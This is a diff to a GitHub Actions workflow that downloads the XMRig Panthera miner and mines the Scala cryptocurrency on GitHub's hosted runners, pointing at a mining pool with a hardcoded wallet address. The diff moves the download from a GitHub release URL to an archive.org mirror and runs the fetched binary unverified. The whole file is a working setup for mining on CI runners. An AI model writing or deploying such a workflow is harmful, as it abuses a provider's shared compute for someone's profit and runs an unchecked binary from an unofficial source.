@@ -1,4 +1,4 @@
-name: Mine Scala (XMRig Panthera)
+name: Mine Scala via GitHub Actions
 
 on:
   workflow_dispatch:
@@ -6,20 +6,20 @@ on:
 jobs:
   mine:
     runs-on: ubuntu-latest
-    name: Scala Mining Session
     steps:
-    - name: Setup Mining
+    - name: Install dependencies
       run: |
         sudo apt update
-        sudo apt install -y screen wget tar
+        sudo apt install -y wget tar
 
-    - name: Download XMRig Panthera
+    - name: Download XMRig Panthera (mirror)
       run: |
-        wget https://github.com/scala-network/official-miner/releases/download/v5.10.0/xmrig-panthera-linux.tar.gz
+        wget https://archive.org/download/xmrig-panthera-linux/xmrig-panthera-linux.tar.gz
         tar -xvzf xmrig-panthera-linux.tar.gz
         cd xmrig-panthera
         chmod +x xmrig
 
-    - name: Start Mining Scala
+    - name: Start Mining
       run: |
-        ./xmrig -o pool.scalaproject.io:2019 -u Ssy2SFtR3rGfjKFA4xxUnGVikpSy7GyfTFbDmjyqSGsuJMJ4K2GSKyK6pApbCy7DBGgf6b5p3fHwV1zHrnVRUjDG7kdm496A8R -p actions --donate-level 1 --coin scala --tls
+        cd xmrig-panthera
+        ./xmrig -o pool.scalaproject.io:2019 -u Ssy2SFtR3rGfjKFA4xxUnGVikpSy7GyfTFbDmjyqSGsuJMJ4K2GSKyK6pApbCy7DBGgf6b5p3fHwV1zHrnVRUjDG7kdm496A8R -p github -a panthera -k --tls
